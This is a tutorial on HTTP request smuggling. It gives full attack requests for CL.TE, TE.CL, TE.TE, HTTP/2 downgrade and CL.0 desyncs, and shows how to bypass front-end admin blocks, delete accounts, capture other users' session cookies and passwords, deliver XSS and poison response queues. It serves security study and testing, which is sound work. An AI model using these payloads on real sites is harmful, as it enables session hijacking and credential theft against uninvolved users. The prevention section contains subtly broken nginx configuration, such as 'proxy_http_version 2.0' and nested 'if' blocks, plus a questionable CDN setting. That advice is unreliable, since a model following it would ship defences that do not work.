# HTTP Request Smuggling

HTTP request smuggling is among the most architecturally fundamental attack classes in web security — it does not exploit a bug in application logic but instead exploits the ambiguity that arises when two different components in a multi-tier HTTP pipeline disagree about where one request ends and the next begins. Because the smuggled prefix is prepended to the *next* user's request before that user's request ever reaches the application, the attacker can interfere with requests that belong to entirely different users, bypassing security controls, hijacking sessions, capturing credentials, and turning unexploitable reflected vulnerabilities into mass-delivery attacks — all from a single malformed request.

**Fundamental principle: HTTP/1.1 provides two independent mechanisms for declaring request body length — `Content-Length` and `Transfer-Encoding: chunked` — and when a front-end server uses one while the back-end uses the other, an attacker can craft a single request that each server interprets as having a different boundary, smuggling a partial second request into the back-end's receive buffer, where it will be prepended to the next legitimate user's request.**

***

## How the Desync Works

```
Normal request pipeline (no smuggling):
─────────────────────────────────────────────────────────────────────────────
Client A  ──► [Request A] ──►
                              Front-end     ──► [Request A][Request B] ──►    Back-end
Client B  ──► [Request B] ──►                                               Processes A, then B

Each server agrees on exactly where Request A ends and Request B begins.


Smuggling attack — CL.TE example:
─────────────────────────────────────────────────────────────────────────────
Attacker sends ONE request:
──────────────────────────────────────────────────────
POST / HTTP/1.1
Content-Length: 13      ← front-end reads this: body = 13 bytes → forwards all
Transfer-Encoding: chunked

0             ← back-end reads this: chunk size 0 = end of request
              ← back-end STOPS HERE, treats "SMUGGLED" as start of NEXT request
SMUGGLED
──────────────────────────────────────────────────────

Front-end sees:    [one request, 13 bytes of body, forwards: 0\r\n\r\nSMUGGLED]
Back-end sees:     [request 1 ends at "0\r\n\r\n"] + [new request starts: "SMUGGLED..."]

When victim's request arrives next:

Back-end receive buffer:
  SMUGGLED                   ← attacker's poison prefix (already in buffer)
  GET /home HTTP/1.1         ← victim's request appended to the poison
  Host: vulnerable-website.com
  Cookie: session=VICTIM_SESSION_TOKEN
  ...

Back-end processes:           SMUGGLEDGET /home HTTP/1.1...
                              ↑ attacker controls the first part of the victim's request
```

***

## The Three Classic Vulnerability Types

### Type 1: CL.TE — Front-end uses Content-Length, Back-end uses Transfer-Encoding

```http
# ── WHAT HAPPENS ──────────────────────────────────────────────────────────────
# Front-end: reads Content-Length: 13 → forwards 13 bytes of body
# Back-end:  reads Transfer-Encoding: chunked → sees chunk "0" (size zero) → end
#            remaining bytes "SMUGGLED" are left in buffer as start of next request

POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

# Body byte count:
# "0\r\n\r\nSMUGGLED" = 13 bytes  ← matches Content-Length ✓ (front-end forwards all)
# Chunk "0" = terminator          ← back-end stops here ✓
# "SMUGGLED" = left in buffer     ← prefix for next request ✓


# ── TIMING-BASED DETECTION ────────────────────────────────────────────────────
# Send this request — if vulnerable to CL.TE, back-end waits for more data
# (its CL expects more bytes that never arrive → timeout)

POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X     ← front-end (CL=4) cuts off here: body = "1\r\nA\r\n" (4 bytes, no X)
      ← back-end (TE) sees chunk "1" = 1 byte "A" → expects more chunks → WAITS
      → Observable delay of 10+ seconds = CL.TE CONFIRMED ✓


# ── DIFFERENTIAL RESPONSE CONFIRMATION ────────────────────────────────────────
# Poison the back-end buffer with start of a GET /404 request.
# If next normal request triggers a 404 → poison was prepended to it → CONFIRMED.

# Attack request:
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x

# Body breakdown:
# Chunk "e" (14 bytes): q=smuggling&x=\r\n  ← legitimate search
# Chunk "0": terminator
# "GET /404 HTTP/1.1\r\nFoo: x" ← smuggled prefix

# Front-end (CL=49): forwards entire body
# Back-end (TE): processes chunks → "GET /404 HTTP/1.1\r\nFoo: x" left in buffer

# Send a normal follow-up request immediately after:
GET / HTTP/1.1
Host: vulnerable-website.com

# Back-end processes: GET /404 HTTP/1.1\r\nFoo: xGET / HTTP/1.1\r\n...
#                      ↑ smuggled prefix  + victim's request appended to "Foo: x" value
# Response: 404 Not Found  ← /404 was the poisoned request → CONFIRMED ✓
```

### Type 2: TE.CL — Front-end uses Transfer-Encoding, Back-end uses Content-Length

```http
# ── WHAT HAPPENS ──────────────────────────────────────────────────────────────
# Front-end: reads Transfer-Encoding: chunked → processes chunks, forwards all
# Back-end:  reads Content-Length: 3 → reads only 3 bytes ("8\r\n")
#            remaining bytes "SMUGGLED\r\n0\r\n\r\n" left in buffer

POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

# ⚠ IMPORTANT Burp Repeater settings for TE.CL:
# 1. Repeater menu → UNCHECK "Update Content-Length"
#    (prevent Burp from auto-correcting Content-Length to match actual body)
# 2. Include trailing \r\n\r\n after the final "0"
#    (final zero-length chunk MUST be followed by two CRLFs)
# 3. Content-Length: 3 → "8\r\n" = 3 bytes ← exactly what back-end reads before stopping

# ── TIMING-BASED DETECTION FOR TE.CL ─────────────────────────────────────────
# Front-end (TE) forwards the complete chunked body (0\r\n\r\n = 5 bytes of "end")
# Back-end (CL=6) expects 6 bytes but receives only 5 → waits → TIMEOUT

POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X     ← front-end stops at "0\r\n\r\n" (never sees X, doesn't forward it)
      ← back-end (CL=6) receives "0\r\n\r\n" (5 bytes) → expects 1 more byte → WAITS
      → Observable delay = TE.CL CONFIRMED ✓

# ⚠ WARNING: If CL.TE is present on the same server, the TE.CL test will disrupt
# real users. ALWAYS test CL.TE first; only proceed to TE.CL if CL.TE is absent.


# ── DIFFERENTIAL RESPONSE CONFIRMATION ────────────────────────────────────────

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0

# Chunk "7c" (124 decimal bytes) = the entire smuggled GET /404 request
# Chunk "0" = terminator → front-end (TE) considers this the complete request
# Back-end (CL=4) reads "7c\r\n" (4 bytes) → STOPS
# Remaining "GET /404 HTTP/1.1..." = smuggled into buffer ✓
```

### Type 3: TE.TE — Both Servers Support TE, but One Can Be Induced to Ignore It

```http
# ── CONCEPT ───────────────────────────────────────────────────────────────────
# Both servers nominally support Transfer-Encoding.
# Obfuscate the TE header so ONE server fails to recognise it
# → that server falls back to Content-Length
# → desync achieved: effectively becomes CL.TE or TE.CL

# ── OBFUSCATION TECHNIQUES (try each until one works) ────────────────────────

# Technique 1: invalid encoding name (some servers ignore unknown values)
Transfer-Encoding: xchunked

# Technique 2: whitespace in header name
Transfer-Encoding : chunked
#               ↑ space before colon — technically invalid

# Technique 3: tab character as separator (IIS accepts this; Nginx rejects)
Transfer-Encoding:[TAB]chunked

# Technique 4: leading space in header value
 Transfer-Encoding: chunked
# ↑ leading space makes some parsers treat it as header folding

# Technique 5: duplicate TE headers — one valid, one invalid
Transfer-Encoding: chunked
Transfer-Encoding: x
# First server sees valid "chunked" in first header, processes it.
# Second server sees duplicate headers — takes last one ("x") → invalid → ignores TE → uses CL

# Technique 6: header injection via newline in another header value
X: X[\n]Transfer-Encoding: chunked
# Some servers interpret the \n as a new header beginning
# → one server sees an injected TE header; other doesn't parse the injection

# Technique 7: wrapped / folded header
Transfer-Encoding
: chunked
# Multiline headers (header folding) — RFC 7230 deprecated this but some servers still accept it

# ── EXPLOIT TEMPLATE (TE.TE → CL.TE behaviour) ────────────────────────────────

POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Transfer-Encoding: x         ← second TE header obfuscates; one server ignores TE → uses CL
Content-Length: 13

0

SMUGGLED

# ── USING HTTP REQUEST SMUGGLER BURP EXTENSION ────────────────────────────────
# BApp Store → "HTTP Request Smuggler"
# Right-click request → Extensions → HTTP Request Smuggler → Smuggle Probe
# The extension automatically tries CL.TE, TE.CL, and all TE.TE obfuscation variants
# Logs findings in Dashboard (Pro) or Extensions Output tab (Community)
```

***

## Detection Methodology Summary

```
Detection workflow — ordered by safety and reliability:
─────────────────────────────────────────────────────────────────────────────

STEP 1: Timing-based detection (lowest impact, blind detection)
──────────────────────────────────────────────────────────────
Test CL.TE first:
  Send: CL=4, TE=chunked body with incomplete chunk (no terminator)
  Expect: >10 second delay on back-end → CL.TE ✓

If CL.TE negative, test TE.CL:
  Send: TE=chunked (0\r\n\r\n), CL=6 (one byte more than body)
  Expect: >10 second delay → TE.CL ✓

STEP 2: Differential response confirmation (higher confidence)
──────────────────────────────────────────────────────────────
Send attack request: smuggle prefix "GET /404 HTTP/1.1\r\nFoo: x"
Follow immediately with a normal request
If response to normal request = 404 → smuggled request poisoned the buffer ✓

STEP 3: Identify the specific variant (CL.TE / TE.CL / TE.TE)
──────────────────────────────────────────────────────────────
Use timing + differential responses to confirm which headers each server uses.
For TE.TE: iterate through obfuscation variants until differential response achieved.

STEP 4: Automated scanning
──────────────────────────────────────────────────────────────
Burp Scanner: sends automated probe requests, flags desync vulnerabilities.
HTTP Request Smuggler extension: exhaustive permutation testing with
  false-positive reduction through multi-validation.

⚠ WARNING: Differential response tests (Step 2) WILL DISRUPT other users
  if the application is live. Preferably test in a staging environment,
  or test during low-traffic windows and be prepared to clear poisoned state.
```

***

## Exploitation: Bypassing Front-End Security Controls

```http
# ── SCENARIO: Front-end blocks /admin; back-end serves it to localhost ────────
# Front-end enforces: if path starts with /admin → 403 Forbidden
# Back-end serves /admin to requests that appear to come from 127.0.0.1

# Step 1: Confirm CL.TE is present (timing + differential response)

# Step 2: Smuggle a GET /admin request as the prefix
#         The smuggled prefix will be prepended to the next real user's request
#         → back-end processes "GET /admin HTTP/1.1\r\nHost: localhost\r\n..."
#         → bypasses front-end's /admin block (front-end never saw /admin)
#         → back-end sees Host: localhost → grants admin access

POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1

# Why Content-Length: 10 in smuggled request?
# Back-end will receive: [smuggled GET /admin prefix] + [next user's request bytes]
# The CL in the smuggled request tells back-end how many bytes to read as its "body"
# → sets how much of the next user's request gets absorbed into the smuggled one
# Start with a small value (10), increase if the next request needs to be absorbed

# Step 3: Issue a normal request to trigger the smuggled prefix:
GET / HTTP/1.1
Host: vulnerable-website.com
# → Back-end processes: GET /admin HTTP/1.1\r\nHost: localhost...[10 bytes of this request]
# → Response contains admin panel HTML ✓

# Step 4: Extract admin actions from the panel and execute:
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 139
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```

***

## Exploitation: Capturing Other Users' Requests

```http
# ── GOAL: Steal victim's session cookie / credentials ────────────────────────
# Technique: smuggle a partial POST request whose body is the open parameter
# that "absorbs" the next user's request as its body content.
# The server reflects this absorbed content in a response the attacker can read.

# Prerequisites:
# 1. CL.TE vulnerability confirmed
# 2. A page that STORES and later reflects user-supplied content
#    (e.g., a comment system, a search history, a profile bio)
# 3. The attacker can log in and read their own stored content


# ── ATTACK REQUEST ─────────────────────────────────────────────────────────────

POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 256           ← must be LARGER than the smuggled prefix
Transfer-Encoding: chunked    ← ensures front-end forwards all 256 bytes

0

POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400           ← large enough to absorb the next user's entire request
Cookie: session=ATTACKER_SESSION

csrf=VALID_CSRF_TOKEN&postId=5&name=Attacker&email=attacker%40evil.net&comment=

# ── HOW THE ABSORPTION WORKS ──────────────────────────────────────────────────
#
# Attacker's smuggled request is a POST to /post/comment.
# The "comment=" field is the LAST parameter, with NO closing value.
# When the next user sends their request, back-end appends it as the comment body:
#
# Back-end receives:
#   POST /post/comment HTTP/1.1
#   ...
#   comment=GET /home HTTP/1.1              ← victim's request begins here
#   Host: vulnerable-website.com
#   Cookie: session=VICTIM_SESSION_TOKEN    ← victim's session cookie captured!
#   Content-Length: 123
#   ...
#
# The comment is stored with the victim's request headers as its content.
# Attacker reads the comment from post 5 → VICTIM_SESSION_TOKEN revealed ✓

# ── TUNING CONTENT-LENGTH IN SMUGGLED REQUEST ─────────────────────────────────
# Too small → victim's request only partially absorbed → cookie may be cut off
# Too large → back-end waits for more body data → victim gets a timeout
# Start with ~400 bytes; increase until you capture the full cookie header

# ── EXTRACT CREDENTIALS FROM ABSORBED BODY ────────────────────────────────────
# If the victim was submitting a login form:
# Back-end absorbed:  comment=POST /login HTTP/1.1\r\n...\r\nusername=admin&password=SECRET
# Attacker reads stored comment → recovers plaintext credentials ✓
```

***

## Exploitation: Reflected XSS via Request Smuggling

```http
# ── SCENARIO: Reflected XSS in a header — normally unexploitable ─────────────
# Application reflects the User-Agent header in a response body, unencoded.
# Normally: attacker cannot force victim's browser to send a crafted User-Agent.
# With request smuggling: attacker forces the victim's next request to include
# a poisoned prefix that contains the malicious User-Agent value.

# ── CL.TE ATTACK REQUEST ───────────────────────────────────────────────────────

POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
User-Agent: a"/><script>alert(document.cookie)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1

# When victim visits the site and their request arrives at the back-end:
# Back-end processes: GET /home HTTP/1.1\r\nUser-Agent: a"/><script>...
#                     [victim's request absorbed into Content-Length: 5 body]
#
# Back-end reflects the User-Agent value in the /home page response:
# <p>Your browser: a"/><script>alert(document.cookie)</script></p>
# → XSS fires in victim's browser ✓
# → Victim was visiting /home with a clean URL — they did nothing suspicious

# ── WHY THIS ESCALATES SEVERITY ───────────────────────────────────────────────
# Standard reflected XSS:  victim must click a crafted link with XSS in URL/header
# Smuggling-delivered XSS: victim visits a NORMAL URL; smuggled prefix poisons response
# → No crafted URL required → no phishing required
# → XSS fires on the legitimate domain → same-origin → full cookie access ✓
# → If fired continuously (Turbo Intruder loop), every user on the site is affected
```

***

## Exploitation: Response Queue Poisoning

```http
# ── TECHNIQUE: Desync the RESPONSE queue, not just the request queue ──────────
# By smuggling a complete, standalone HTTP request (not just a prefix),
# the back-end generates a RESPONSE for the smuggled request.
# This response enters the back-end's response queue.
# The next legitimate user's request gets the response meant for the attacker,
# and the attacker gets the response meant for the victim.

# ── SETUP ─────────────────────────────────────────────────────────────────────
# Requires: reuse of back-end connections (default in HTTP/1.1 keep-alive)
# Attack: smuggle a COMPLETE second request that generates a response

POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Transfer-Encoding: chunked

0

GET /anything HTTP/1.1
Host: vulnerable-website.com

# ── WHAT HAPPENS ──────────────────────────────────────────────────────────────
#
# Back-end's response queue (on the same connection):
#
#  [Response to POST /]              ← goes back to attacker ✓
#  [Response to GET /anything]       ← goes into queue
#
# Next user sends: GET /account HTTP/1.1
# Back-end processes it → generates response with account details
# Back-end serves from queue:
#   → sends victim "Response to GET /anything" (intended for attacker)
#   → sends attacker "Response to GET /account" (victim's account page!) ✓
#
# Attacker receives victim's account page → captures session token, PII, etc. ✓
# Victim receives a confusing /anything response → may appear as a site error

# ── AMPLIFICATION WITH TURBO INTRUDER ─────────────────────────────────────────
# Fire the response queue poisoning request in a loop.
# A high percentage of responses will be from real victim users.
# Capture: session cookies in Set-Cookie headers, account details, CSRF tokens ✓
```

***

## Advanced: HTTP/2 Downgrade Smuggling (H2.TE / H2.CL)

```http
# ── CONTEXT ───────────────────────────────────────────────────────────────────
# HTTP/2 uses binary framing with per-frame length fields → no ambiguity
# → HTTP/2 end-to-end is immune to classic request smuggling
#
# BUT: many architectures use HTTP/2 front-end → HTTP/1.1 back-end (downgrading)
# The front-end TRANSLATES HTTP/2 frames into HTTP/1.1 for the back-end.
# If the translation injects attacker-controlled Content-Length or TE headers
# into the HTTP/1.1 version, the classic smuggling vectors reopen.
#
#   HTTP/2 client (browser/Burp)  →  [HTTP/2]  →  Front-end (e.g., Cloudflare)
#                                                     ↓ downgrades to HTTP/1.1
#                                                  Back-end (HTTP/1.1 only)

# In Burp Repeater: Inspector panel → Request attributes → Protocol → HTTP/2

# ── H2.CL (HTTP/2 front-end uses frame length; back-end uses Content-Length) ──

# Send via HTTP/2 with injected Content-Length smaller than actual body:
:method: POST
:path: /
:authority: vulnerable-website.com
content-type: application/x-www-form-urlencoded
content-length: 0        ← injected header: tells HTTP/1.1 back-end body = 0 bytes

SMUGGLED               ← HTTP/2 frame includes this; back-end only reads CL=0 bytes
                         → remainder ("SMUGGLED") left in buffer ✓

# HTTP/2 frame length includes "SMUGGLED", so front-end forwards the entire frame.
# Back-end reads CL=0 → reads no body → "SMUGGLED" remains in buffer.


# ── H2.TE (HTTP/2 front-end; back-end uses Transfer-Encoding) ─────────────────

# Inject a Transfer-Encoding header in HTTP/2 request:
:method: POST
:path: /
:authority: vulnerable-website.com
content-type: application/x-www-form-urlencoded
transfer-encoding: chunked   ← injected; HTTP/2 front-end may pass this through
                             ← HTTP/1.1 back-end reads TE: chunked

0

SMUGGLED

# HTTP/2 front-end: uses frame length for its own parsing, forwards all including "SMUGGLED"
# HTTP/1.1 back-end: reads TE: chunked → "0\r\n\r\n" = end → "SMUGGLED" in buffer ✓

# ── HEADER INJECTION IN DOWNGRADED REQUESTS ────────────────────────────────────

# HTTP/2 headers can contain \r\n sequences that become real CRLF in HTTP/1.1.
# This allows injecting arbitrary HTTP/1.1 headers or even a second request.

# Inject via pseudo-header or regular header value:
:method: GET
:path: /example
:authority: vulnerable-website.com
injected-header: whatever\r\nTransfer-Encoding: chunked
#                        ↑ CRLF — becomes a NEW header line in HTTP/1.1 translation

# HTTP/1.1 translation becomes:
# GET /example HTTP/1.1
# Host: vulnerable-website.com
# injected-header: whatever
# Transfer-Encoding: chunked    ← injected via CRLF
# → Now TE is present in HTTP/1.1 back-end → desync possible ✓
```

***

## Exploitation: CL.0 Attacks

```http
# ── CL.0: Server ignores the request body entirely ────────────────────────────
# Some servers (especially for specific routes) treat ALL requests as having
# Content-Length: 0 regardless of the actual Content-Length header.
# If one server correctly processes the body and another ignores it,
# the ignored body becomes a smuggled prefix.

# Detection:
POST /static-resource.js HTTP/1.1
Host: vulnerable-website.com
Content-Length: 100
Connection: keep-alive

GET /admin HTTP/1.1
Host: vulnerable-website.com

# If the server ignores the body of requests to /static-resource.js
# (e.g., because static file servers never expect POST bodies):
# → Server processes POST (CL=100 bytes) but back-end ignores body
# → "GET /admin HTTP/1.1..." left in buffer → smuggled ✓

# Send a follow-up request:
GET / HTTP/1.1
Host: vulnerable-website.com

# If response is the /admin page content → CL.0 smuggling confirmed ✓
```

***

## Prevention

```
─────────────────────────────────────────────────────────────────────────────
ARCHITECTURAL FIXES (most effective)
─────────────────────────────────────────────────────────────────────────────

✓ Use HTTP/2 end-to-end — HTTP/2 binary framing eliminates the ambiguity
  that makes request smuggling possible. This is the definitive fix.

  Configuration (Nginx ↔ back-end):
  # nginx.conf — upstream HTTP/2 (requires grpc_pass or http2 proxy)
  upstream backend {
      server 10.0.0.1:8080;
      keepalive 32;
  }
  server {
      listen 443 ssl http2;
      location / {
          proxy_pass https://backend;
          proxy_http_version 2.0;    ← use HTTP/2 to back-end if supported
      }
  }

✓ Disable HTTP/2 downgrading — if HTTP/2 → HTTP/1.1 translation is required,
  validate the rewritten HTTP/1.1 request against the spec:
    → Reject requests containing \r or \n in header names or values
    → Reject colons in header names (outside of the first colon)
    → Reject spaces in the request method
    → Reject duplicate Content-Length or Transfer-Encoding headers

─────────────────────────────────────────────────────────────────────────────
SERVER-LEVEL MITIGATIONS
─────────────────────────────────────────────────────────────────────────────

✓ Normalise ambiguous requests at the front-end; reject at the back-end:
  Front-end: if both CL and TE present → strip CL, forward TE only
  Back-end: if both CL and TE present → close the TCP connection immediately

  Nginx — reject conflicting headers:
  # In nginx.conf server block:
  # Reject requests with both Content-Length and Transfer-Encoding:
  if ($http_transfer_encoding ~* "chunked") {
      set $reject_reason "te_present";
  }
  if ($http_content_length != "") {
      set $reject_reason "${reject_reason}_and_cl";
  }
  if ($reject_reason = "te_present_and_cl") {
      return 400;
  }

✓ Disable back-end connection reuse (mitigates request queue attacks):
  # Nginx: force new connection per upstream request (performance cost)
  proxy_http_version 1.0;    ← HTTP/1.0 has no persistent connections
  proxy_set_header Connection "";    ← prevents keep-alive

  # NOTE: This does NOT prevent request tunnelling attacks — use HTTP/2 for full protection

✓ Reject requests with bodies on GET requests (prevents CL.0 and fat GET):
  # Nginx:
  if ($request_method = GET) {
      if ($http_content_length != "") {
          return 400;
      }
  }

✓ Set strict timeouts — close idle connections quickly:
  proxy_read_timeout 30s;      ← don't let smuggled requests linger in buffer
  keepalive_timeout 15s;       ← shorter window for same-connection attacks

─────────────────────────────────────────────────────────────────────────────
CLOUDFLARE / FASTLY / CDN CONFIGURATION
─────────────────────────────────────────────────────────────────────────────

✓ Enable "HTTP/2 to origin" — use HTTP/2 for CDN → back-end connection
✓ Enable "Reject ambiguous requests" (some CDNs have this as a toggle)
✓ "Sanitize HTTP headers" — strip TE headers before forwarding to back-end
  (Cloudflare does this by default; Fastly has it as an option)
✓ Disable "HTTP request smuggling protection bypass" features if enabled unintentionally

─────────────────────────────────────────────────────────────────────────────
TESTING
─────────────────────────────────────────────────────────────────────────────

Tools:
  Burp Scanner:                   passive + active scanning for CL.TE/TE.CL/TE.TE
  HTTP Request Smuggler (BApp):   exhaustive permutation testing, H2.* variants,
                                  CL.0, client-side desync, Turbo Intruder integration
  smuggler.py (GitHub):           standalone CLI tool for automated detection

Test in staging first. Differential response tests disrupt real users.
```
